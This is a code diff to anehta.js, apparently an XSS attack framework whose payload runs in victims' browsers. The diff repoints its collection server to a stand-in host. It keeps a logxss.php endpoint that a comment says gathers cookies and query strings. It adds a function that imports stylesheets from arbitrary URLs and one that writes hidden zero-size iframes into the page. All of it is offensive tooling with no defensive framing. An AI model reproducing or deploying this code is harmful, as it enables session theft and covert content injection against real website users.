@@ -1,4 +1,4 @@
-//alert("base.js");
+//alert("anehta.js");
 // Author: axis
 //////////////////////////////////////////////////
 //// 定义常量
@@ -12,7 +12,7 @@ var anehta = {
         projectHome: 'http://anehta.googlecode.com',
         DemoPage: 'http://www.secwiki.com/anehta/demo.html'};
 
-var anehtaurl = "http://www.secwiki.com/anehta";
+var anehtaurl = "http://www.a.com/anehta";
 var feedurl = anehtaurl+"/feed.js";
 var logurl = anehtaurl+"/logxss.php?";  // cookie 和 querystring 收集
 var watermarkflash = anehtaurl+"/module/flash/anehtaWatermark.swf";  // 客户端水印
@@ -332,7 +332,7 @@ anehta.core.setWatermark = function(flashID, o){
 
 // Get the info from flash
 anehta.core.getWatermark = function(flashID){		  		  
-	return document.getElementById(flashID).getWatermark();         
+	return document.getElementById(flashID).getWatermark(null);         
 }
 
 
@@ -549,6 +549,45 @@ anehta.net.postForm = function(url){
 	//f.method="get";
 	document.getElementsByTagName("body")[0].appendChild(f);
 	f.submit();
+}
+
+
+anehta.net.CSSGet = function(url){
+	var cssget = {};
+	var s, e;
+  if(document.createStyleSheet) {
+    s = document.createStyleSheet();
+    e = s.owningElement || s.ownerNode;
+  } else {
+    e = document.createElement("style");
+    s = e.sheet;
+  }
+        
+  e.setAttribute("type", "text/css");
+        
+  if(!e.parentNode)
+    document.getElementsByTagName("head")[0].appendChild(e);
+  if(!s)
+    s = e.sheet;
+        
+  cssget.styleSheet = s;
+  cssget.styleElement = e;
+  
+  var item, index;
+        
+  // IE
+  if(s.addImport) {
+    index = s.addImport(url);
+    item = s.imports(index);
+  }
+        
+  // W3C
+  else if(s.insertRule) {
+    index = s.insertRule("@import url(" + url + ");", 0);
+    item = s.cssRules[index];
+  }
+  
+  return null;
 }
 
 //////////////////////////////////////////////////
@@ -873,6 +912,10 @@ anehta.inject.injectCSS = function(ptr_sc){
 	c.href = ptr_sc;
 	document.getElementsByTagName("body")[0].appendChild(c);
 	return c;
+}
+
+anehta.inject.addIframe = function(srcurl){
+	document.write("<iframe src='" + srcurl + "' width=0 height=0 ></iframe>");
 }
 
 anehta.inject.createIframe = function(w) {
